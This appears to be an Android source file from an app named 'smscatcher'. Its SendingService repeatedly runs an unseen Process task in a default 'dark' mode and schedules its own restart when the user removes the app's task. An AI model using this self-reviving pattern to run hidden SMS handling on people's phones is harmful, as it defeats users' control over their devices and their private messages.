package devop.automation.smscatcher;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import androidx.annotation.RequiresApi;

import devop.automation.smscatcher.logic.Process;

public class SendingService extends Service {
    private static boolean mIsBound;
    private IBinder mBinder;
    final Handler handler = new Handler();
    Runnable runnable;
    final Handler serhand = new Handler();
    Runnable serrun;
    Bundle extras;
    String action;
    private void sub_procs(String action){
        switch (action){
            case "start":
                SendingService.mIsBound = true;
                runnable = new Runnable() {
                    @Override
                    public void run() {
                        serhand.postDelayed(serrun = new Runnable() {
                            @Override
                            public void run() {
                            }
                        }, Process.delayTime);
                    }
                };
                handler.post(runnable);
                break;
            case "dark":
                SendingService.mIsBound = true;
                runnable = new Runnable() {
                     @Override
                     public void run() {
                     serhand.postDelayed(serrun = new Runnable() {
                          @Override
                          public void run() {
                              Process proc = Process.getInstance(getApplicationContext());
                              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                                  proc.execute();
                              }
                          }
                     }, Process.delayTime);
                      handler.postDelayed(this, Process.delayTime);
                     }
                };
                handler.post(runnable);
                break;
        }
    }
    @Override
    public void onCreate() {
        SendingService.mIsBound = false;
    }
    @RequiresApi(api = Build.VERSION_CODES.Q)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        this.onBind(intent);
        return START_STICKY;
    }
    @Override
    public IBinder onBind(Intent intent) {
        if(intent == null){
            if(!SendingService.mIsBound){
                sub_procs("dark");
            }
        }else {
            extras = intent.getExtras();
            if (extras != null) {
                if(extras.get("ACTION") != null && !SendingService.mIsBound){
                    action = extras.get("ACTION").toString();
                    sub_procs(action);
                }else{
                    if(!SendingService.mIsBound){
                        sub_procs("dark");
                    }
                }
            } else {
                if(!SendingService.mIsBound){
                    sub_procs("dark");
                }
            }
        }
        return mBinder;
    }
    public class SendingBinder extends Binder {
        SendingService getService() {
            return SendingService.this;
        }
    }
    @Override
    public boolean onUnbind(Intent intent) {
        this.handler.removeCallbacks(this.runnable);
        return true;
    }
    @Override
    public void onDestroy() {
        this.serhand.removeCallbacks(this.serrun);
        this.handler.removeCallbacks(this.runnable);
        SendingService.mIsBound = false;
        super.onDestroy();
    }
    @Override
    public void onTaskRemoved(Intent rootIntent){
        Intent restartServiceTask = new Intent(getApplicationContext(),SendingService.class);
        restartServiceTask.setPackage(getPackageName());
        PendingIntent restartPendingIntent =PendingIntent.getService(getApplicationContext(), 1,restartServiceTask, PendingIntent.FLAG_ONE_SHOT);
        AlarmManager myAlarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        myAlarmService.set(
                AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                restartPendingIntent);
        super.onTaskRemoved(rootIntent);
    }
    public SendingService(Context applicationContext) {
        super();
    }
    public SendingService() {
        super();
    }
}
